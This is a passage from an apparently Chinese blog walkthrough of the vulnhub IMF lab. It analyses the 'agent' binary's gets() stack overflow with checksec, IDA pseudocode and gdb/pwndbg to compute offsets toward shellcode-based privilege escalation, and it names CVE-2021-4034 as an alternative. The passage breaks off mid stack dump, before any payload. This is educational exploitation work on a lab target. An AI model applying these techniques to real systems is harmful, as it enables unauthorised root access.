+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.146/imfadministrator/uploads/agent</span><br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><blockquote>
+<p>通过栈溢出进行提权。</p>
+<p>参考：<a target="_blank" rel="noopener" href="http://cn-sec.com/archives/555761.html">vulnhub_IMF缓冲区溢出详解 | CN-SEC 中文网</a></p>
+<p>第二种方法：cve-2021-4034（通杀漏洞，202112发现，2022-3-15被cve记录）</p>
+</blockquote>
+<h3 id="1、查看文件保护"><a href="#1、查看文件保护" class="headerlink" title="1、查看文件保护"></a>1、查看文件保护</h3><p><strong>使用 file 和 checksec 查看文件信息和保护措施：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> file agent</span><br>agent: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=444d1910b8b99d492e6e79fe2383fd346fc8d4c7, not stripped<br><span class="hljs-meta">$</span><span class="bash"> checksec agent</span><br>[*] &#x27;/home/pwn/桌面/agent&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments<br></code></pre></td></tr></table></figure>
+<p>可以看到文件基本信息：32 位、小端序、动态链接程序，且存在<strong>可读可写可执行段</strong> 。</p>
+<h3 id="2、伪代码分析"><a href="#2、伪代码分析" class="headerlink" title="2、伪代码分析"></a>2、伪代码分析</h3><p>将 agent 文件拖入 32 位的 IDA 中进行分析，按 <code>shift+f12</code> 没找到 <code>system(&#39;/bin/sh&#39;)</code> 相关内容。</p>
+<p>按 F5 查看伪代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> *s2; <span class="hljs-comment">// [esp+8h] [ebp-20h]</span><br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Eh] [ebp-1Ah]</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [esp+1Fh] [ebp-9h]</span><br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  asprintf(&amp;s2, <span class="hljs-string">&quot;%i&quot;</span>, <span class="hljs-number">48093572</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  ___ __  __ ___ &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; |_ _|  \\/  | __|  Agent&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  | || |\\/| | _|   Reporting&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; |___|_|  |_|_|    System\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nAgent ID : &quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !fgets(&amp;s, <span class="hljs-number">9</span>, <span class="hljs-built_in">stdin</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(&amp;s, s2, <span class="hljs-number">8u</span>) )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>      v7 = getchar();<br>    <span class="hljs-keyword">while</span> ( v7 != <span class="hljs-number">10</span> &amp;&amp; v7 != <span class="hljs-number">-1</span> );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Login Validated &quot;</span>);<br>    v6 = menu();<br>    <span class="hljs-keyword">switch</span> ( v6 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        extractionpoints();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        requestextraction();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        report();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Exiting...&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    result = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Agent ID &quot;</span>);<br>    result = <span class="hljs-number">-2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>下面是溢出函数 report：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">report</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+4h] [ebp-A4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter report update: &quot;</span>);<br>  gets(&amp;s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Report: %s\n&quot;</span>, &amp;s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Submitted for review.&quot;</span>);<br>  <span class="hljs-keyword">return</span> &amp;s;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>看完伪代码后，可以知道是栈溢出，溢出的位置不难找，只要控制 report 中的 gets 函数读入填充的数据，即可产生栈溢出，但是没有 shellcode，需要我们自己写入 RWX 段，然后将函数的返回地址改为 shellcode 地址。</p>
+<h3 id="3、gdb-分析"><a href="#3、gdb-分析" class="headerlink" title="3、gdb 分析"></a>3、gdb 分析</h3><p>使用 gdb 分析，计算栈偏移，首先在 <code>_gets</code> 函数那里打个断点：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804890E report          proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; CODE XREF: main+12F↑p</span><br><span class="hljs-symbol">.text:</span>0804890E<br><span class="hljs-symbol">.text:</span>0804890E s               = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">0A4h</span><br><span class="hljs-symbol">.text:</span>0804890E var_C           = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>0804890E<br><span class="hljs-symbol">.text:</span>0804890E <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>0804890E                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>0804890F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">esp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048911</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0A8h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048917</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>0804891A                 <span class="hljs-keyword">push</span>    offset aEnterReportUpd <span class="hljs-comment">; &quot;\nEnter report update: &quot;</span><br><span class="hljs-symbol">.text:</span>0804891F                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048924</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048927</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>0804892A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+s]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048930</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">eax</span>             <span class="hljs-comment">; s</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048931</span>                 <span class="hljs-keyword">call</span>    _gets<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048936</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048939</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>0804893C                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+s]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048942</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048943</span>                 <span class="hljs-keyword">push</span>    offset aReportS <span class="hljs-comment">; &quot;Report: %s\n&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048948</span>                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804894D</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048950</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048953</span>                 <span class="hljs-keyword">push</span>    offset aSubmittedForRe <span class="hljs-comment">; &quot;Submitted for review.&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048958</span>                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804895D</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048960</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+s]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048966</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_C], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048969</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+var_C]<br><span class="hljs-symbol">.text:</span>0804896C                 <span class="hljs-keyword">leave</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804896D</span>                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb agent</span> <br>GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1<br>Copyright (C) 2020 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type &quot;show copying&quot; and &quot;show warranty&quot; for details.<br>This GDB was configured as &quot;x86_64-linux-gnu&quot;.<br>Type &quot;show configuration&quot; for configuration details.<br>For bug reporting instructions, please see:<br>&lt;http://www.gnu.org/software/gdb/bugs/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br><br>For help, type &quot;help&quot;.<br>Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...<br>pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.<br>pwndbg: created $rebase, $ida gdb functions (can be used with print/break)<br>Reading symbols from agent...<br>(No debugging symbols found in agent)<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *0x08048931</span><br>Breakpoint 1 at 0x8048931<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> r</span><br></code></pre></td></tr></table></figure>
+<p>输入 48093572（这里主要是越过 strncmp 函数，需要让 S2 与 S 相同），然后输入 3 进入 report 函数，到达 gets 函数，接着 next ，输入 ‘AAAAAAAA’ 。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs shell">Starting program: /home/pwn/桌面/agent <br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : 48093572<br>Login Validated <br>Main Menu:<br>1. Extraction Points<br>2. Request Extraction<br>3. Submit Report<br>0. Exit<br>Enter selection: 3<br><br>Enter report update: <br>Breakpoint 1, 0x08048931 in report ()<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>─────────────────────────────────[ REGISTERS ]──────────────────────────────────<br> EAX  0xffffd0e4 —▸ 0xf7fe188e ◂— mov    edi, eax<br> EBX  0x0<br> ECX  0xffffffff<br> EDX  0x16<br> EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> EBP  0xffffd188 —▸ 0xffffd1b8 ◂— 0x0<br> ESP  0xffffd0d0 —▸ 0xffffd0e4 —▸ 0xf7fe188e ◂— mov    edi, eax<br> EIP  0x8048931 (report+35) —▸ 0xfffb3ae8 ◂— 0xfffb3ae8<br>───────────────────────────────────[ DISASM ]───────────────────────────────────<br> ► 0x8048931 &lt;report+35&gt;    call   gets@plt &lt;gets@plt&gt;<br>        arg[0]: 0xffffd0e4 —▸ 0xf7fe188e ◂— mov    edi, eax<br>        arg[1]: 0x1<br>        arg[2]: 0x0<br>        arg[3]: 0x80482ea ◂— pop    edi /* &#x27;__isoc99_scanf&#x27; */<br> <br>   0x8048936 &lt;report+40&gt;    add    esp, 0x10<br>   0x8048939 &lt;report+43&gt;    sub    esp, 8<br>   0x804893c &lt;report+46&gt;    lea    eax, [ebp - 0xa4]<br>   0x8048942 &lt;report+52&gt;    push   eax<br>   0x8048943 &lt;report+53&gt;    push   0x8048d6a<br>   0x8048948 &lt;report+58&gt;    call   printf@plt &lt;printf@plt&gt;<br> <br>   0x804894d &lt;report+63&gt;    add    esp, 0x10<br>   0x8048950 &lt;report+66&gt;    sub    esp, 0xc<br>   0x8048953 &lt;report+69&gt;    push   0x8048d76<br>   0x8048958 &lt;report+74&gt;    call   puts@plt &lt;puts@plt&gt;<br>───────────────────────────────────[ STACK ]────────────────────────────────────<br>00:0000│ esp  0xffffd0d0 —▸ 0xffffd0e4 —▸ 0xf7fe188e ◂— mov    edi, eax<br>01:0004│      0xffffd0d4 ◂— 0x1<br>02:0008│      0xffffd0d8 ◂— 0x0<br>03:000c│      0xffffd0dc —▸ 0x80482ea ◂— pop    edi /* &#x27;__isoc99_scanf&#x27; */<br>04:0010│      0xffffd0e0 —▸ 0x804b02c (__isoc99_scanf@got.plt) —▸ 0xf7e20440 (__isoc99_scanf) ◂— endbr32 <br>05:0014│ eax  0xffffd0e4 —▸ 0xf7fe188e ◂— mov    edi, eax<br>06:0018│      0xffffd0e8 —▸ 0x80482ea ◂— pop    edi /* &#x27;__isoc99_scanf&#x27; */<br>07:001c│      0xffffd0ec —▸ 0xf7ffd990 ◂— 0<br>─────────────────────────────────[ BACKTRACE ]──────────────────────────────────<br> ► f 0  8048931 report+35<br>   f 1  804872f main+308<br>   f 2 f7de9ee5 __libc_start_main+245<br>────────────────────────────────────────────────────────────────────────────────<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> n</span><br>AAAAAAAA<br>0x08048936 in report ()<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────<br> EAX  0xffffd0e4 ◂— &#x27;AAAAAAAA&#x27;<br> EBX  0x0<br>*ECX  0xf7fb5580 (_IO_2_1_stdin_) ◂— mov    byte ptr [edx], ah /* 0xfbad2288 */<br>*EDX  0xffffd0ec —▸ 0xf7ffd900 ◂— 0<br> EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> EBP  0xffffd188 —▸ 0xffffd1b8 ◂— 0x0<br> ESP  0xffffd0d0 —▸ 0xffffd0e4 ◂— &#x27;AAAAAAAA&#x27;<br>*EIP  0x8048936 (report+40) ◂— add    esp, 0x10<br>─────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────<br>   0x8048931 &lt;report+35&gt;    call   gets@plt &lt;gets@plt&gt;<br> <br> ► 0x8048936 &lt;report+40&gt;    add    esp, 0x10<br>   0x8048939 &lt;report+43&gt;    sub    esp, 8<br>   0x804893c &lt;report+46&gt;    lea    eax, [ebp - 0xa4]<br>   0x8048942 &lt;report+52&gt;    push   eax<br>   0x8048943 &lt;report+53&gt;    push   0x8048d6a<br>   0x8048948 &lt;report+58&gt;    call   printf@plt &lt;printf@plt&gt;<br> <br>   0x804894d &lt;report+63&gt;    add    esp, 0x10<br>   0x8048950 &lt;report+66&gt;    sub    esp, 0xc<br>   0x8048953 &lt;report+69&gt;    push   0x8048d76<br>   0x8048958 &lt;report+74&gt;    call   puts@plt &lt;puts@plt&gt;<br>─────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────<br>00:0000│ esp  0xffffd0d0 —▸ 0xffffd0e4 ◂— &#x27;AAAAAAAA&#x27;<br>01:0004│      0xffffd0d4 ◂— 0x1<br>02:0008│      0xffffd0d8 ◂— 0x0<br>03:000c│      0xffffd0dc —▸ 0x80482ea ◂— pop    edi /* &#x27;__isoc99_scanf&#x27; */<br>04:0010│      0xffffd0e0 —▸ 0x804b02c (__isoc99_scanf@got.plt) —▸ 0xf7e20440 (__isoc99_scanf) ◂— endbr32 <br>05:0014│ eax  0xffffd0e4 ◂— &#x27;AAAAAAAA&#x27;<br>... ↓<br>07:001c│ edx  0xffffd0ec —▸ 0xf7ffd900 ◂— 0<br>───────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────<br> ► f 0  8048936 report+40<br>   f 1  804872f main+308<br>   f 2 f7de9ee5 __libc_start_main+245<br>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br></code></pre></td></tr></table></figure>
+<p>输入 stack48 ，在栈中找到 EBP 和字符串 ‘AAAAAAAA’ 的位置：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; stack <span class="hljs-number">48</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ <span class="hljs-built_in">esp</span>  <span class="hljs-number">0xffffd0d0</span> —▸ <span class="hljs-number">0xffffd0e4</span> ◂— <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>│      <span class="hljs-number">0xffffd0d4</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0xffffd0d8</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">03</span>:000c│      <span class="hljs-number">0xffffd0dc</span> —▸ <span class="hljs-number">0x80482ea</span> ◂— <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">edi</span> /* <span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span> */<br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0xffffd0e0</span> —▸ <span class="hljs-number">0x804b02c</span> (__isoc99_scanf@got<span class="hljs-number">.</span>plt) —▸ <span class="hljs-number">0xf7e20440</span> (__isoc99_scanf) ◂— endbr32 <br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>│ <span class="hljs-built_in">eax</span>  <span class="hljs-number">0xffffd0e4</span> ◂— <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span><br>... ↓<br><span class="hljs-number">07</span>:001c│ <span class="hljs-built_in">edx</span>  <span class="hljs-number">0xffffd0ec</span> —▸ <span class="hljs-number">0xf7ffd900</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">08</span>:<span class="hljs-number">0020</span>│      <span class="hljs-number">0xffffd0f0</span> —▸ <span class="hljs-number">0xffffd124</span> —▸ <span class="hljs-number">0xf7dd453c</span> ◂— <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">esi</span><br><span class="hljs-number">09</span>:<span class="hljs-number">0024</span>│      <span class="hljs-number">0xffffd0f4</span> —▸ <span class="hljs-number">0xf7ffdb50</span> —▸ <span class="hljs-number">0xf7ffdaf0</span> —▸ <span class="hljs-number">0xf7fcb3e0</span> —▸ <span class="hljs-number">0xf7ffd990</span> ◂— ...<br>0a:<span class="hljs-number">0028</span>│      <span class="hljs-number">0xffffd0f8</span> —▸ <span class="hljs-number">0xf7fcb420</span> —▸ <span class="hljs-number">0x804834a</span> ◂— <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">edi</span> /* <span class="hljs-string">&#x27;GLIBC_2.7&#x27;</span> */<br><span class="hljs-number">0b</span>:002c│      <span class="hljs-number">0xffffd0fc</span> ◂— <span class="hljs-number">0x1</span><br>... ↓<br><span class="hljs-number">0d</span>:<span class="hljs-number">0034</span>│      <span class="hljs-number">0xffffd104</span> ◂— <span class="hljs-number">0x0</span><br>0e:<span class="hljs-number">0038</span>│      <span class="hljs-number">0xffffd108</span> —▸ <span class="hljs-number">0xf7e49b7d</span> (__overflow+<span class="hljs-number">13</span>) ◂— <span class="hljs-keyword">add</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x16b483</span><br>0f:003c│      <span class="hljs-number">0xffffd10c</span> —▸ <span class="hljs-number">0xf7fb65e0</span> (_IO_file_jumps) ◂— <span class="hljs-number">0</span><br><span class="hljs-number">10</span>:<span class="hljs-number">0040</span>│      <span class="hljs-number">0xffffd110</span> —▸ <span class="hljs-number">0xf7ffd000</span> ◂— <span class="hljs-keyword">and</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xbf</span> /* <span class="hljs-number">0x2bf24</span> */<br><span class="hljs-number">11</span>:<span class="hljs-number">0044</span>│      <span class="hljs-number">0xffffd114</span> —▸ <span class="hljs-number">0x80482c8</span> ◂— <span class="hljs-keyword">add</span>    <span 